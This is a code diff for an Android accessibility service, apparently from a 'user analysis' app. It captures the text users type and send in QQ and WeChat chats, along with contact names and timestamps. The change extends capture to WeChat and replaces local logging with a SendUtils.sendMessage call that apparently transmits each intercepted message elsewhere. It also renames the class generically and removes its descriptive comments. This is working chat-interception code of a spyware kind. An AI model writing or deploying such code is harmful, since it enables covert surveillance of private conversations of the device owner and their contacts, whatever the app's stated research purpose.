@@ -13,6 +13,8 @@ import android.view.accessibility.AccessibilityNodeInfo;
 import android.widget.TextView;
 import android.widget.Toast;
 
+import com.example.useranalysisapp.utils.SendUtils;
+
 import org.w3c.dom.Text;
 
 import java.io.BufferedWriter;
@@ -26,34 +28,21 @@ import java.io.OutputStream;
 import java.io.OutputStreamWriter;
 import java.util.List;
 
-/**
- * 获取QQ聊天界面发送消息的服务，仅限文本。
- * 所有消息用内部存储，放在Log.txt里。
- * 按照“消息内容 存储时间 联系人名称”格式存储，用一个空格隔开。
- */
-public class MobileQQService extends AccessibilityService {
+public class MessageService extends AccessibilityService {
 
-    //Debug方便区分用的常量
-    private static final String DEBUG_TVC = "TYPE_VIEW_CLICKED: ";
-    private static final String DEBUG_TVF = "TYPE_VIEW_FOCUSED: ";
-    private static final String DEBUG_TVTC = "TYPE_VIEW_TEXT_CHANGED";
-
-    private static final String TAG = "QQServiceSend";
     private String inputString = "[]";
-    private String chatPerson = "unkown";
+    private String chatPerson = "unknown";
 
-    public MobileQQService() {
+    public MessageService() {
     }
 
-    /**
-     * 手机qq改版后可能无法正常获取联系人名称。
-     */
+
     @Override
     public void onAccessibilityEvent(AccessibilityEvent event) {
         int eventType = event.getEventType();
-        CharSequence packageName = event.getPackageName();
+        String packageName = event.getPackageName().toString();
 
-        if(packageName.toString().equals("com.tencent.mobileqq")){
+        if(packageName.equals("com.tencent.mobileqq") || packageName.equals("com.tencent.mm")){
 
             switch(eventType){
                 case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:
@@ -64,14 +53,13 @@ public class MobileQQService extends AccessibilityService {
                     if(!event.getText().toString().equals("[发送]")){
                         break;
                     }
-                    //已确认是发送消息，保存输入框内容
 
-                    String insideInputString = inputString.substring(1, inputString.length() - 1).trim();
+                    inputString = inputString.substring(1, inputString.length() - 1).trim();
 
-                    //输入框内容非空
-                    if(insideInputString.length() > 0){
+                    if(inputString.length() > 0){
                         final long sendTime = System.currentTimeMillis() / 1000;
 
+                        /*
                         String path = this.getExternalFilesDir("log").getAbsolutePath();
                         File newFile = new File(path + File.separator + "log.txt");
                         OutputStream os = null;
@@ -94,17 +82,26 @@ public class MobileQQService extends AccessibilityService {
                                 e.printStackTrace();
                             }
                         }
+
+                         */
+                        if(packageName.equals("com.tencent.mobileqq")) {
+                            SendUtils.sendMessage(inputString, sendTime, "QQ");
+                        } else {
+                            SendUtils.sendMessage(inputString, sendTime, "微信");
+                        }
                     }
 
                     break;
-                /*
-                 * 获取聊天界面顶部文本，认为是联系人名称。
-                 * 如果手机qq版本改变，ViewId可能会发生变化。
-                 * 如果使用event.getText().toString()只能得到“[]”。
-                 */
+
                 case AccessibilityEvent.TYPE_VIEW_FOCUSED:
                     AccessibilityNodeInfo rootNode = getRootInActiveWindow();
-                    List<AccessibilityNodeInfo> chatPersonList = rootNode.findAccessibilityNodeInfosByViewId("com.tencent.mobileqq:id/title");
+                    List<AccessibilityNodeInfo> chatPersonList = null;
+                    if(packageName.equals("com.tencent.mobileqq")) {
+                        chatPersonList = rootNode.findAccessibilityNodeInfosByViewId("com.tencent.mobileqq:id/title");
+                    } else {
+                        //rootNode.findAccessibilityNodeInfosByText("")
+                        chatPersonList = rootNode.findAccessibilityNodeInfosByViewId("com.tencent.mm:id/gas");
+                    }
                     if(chatPersonList.size() != 0){
                         AccessibilityNodeInfo chatPersonInfo = chatPersonList.get(0);
                         CharSequence chatPersonText = chatPersonInfo.getText();
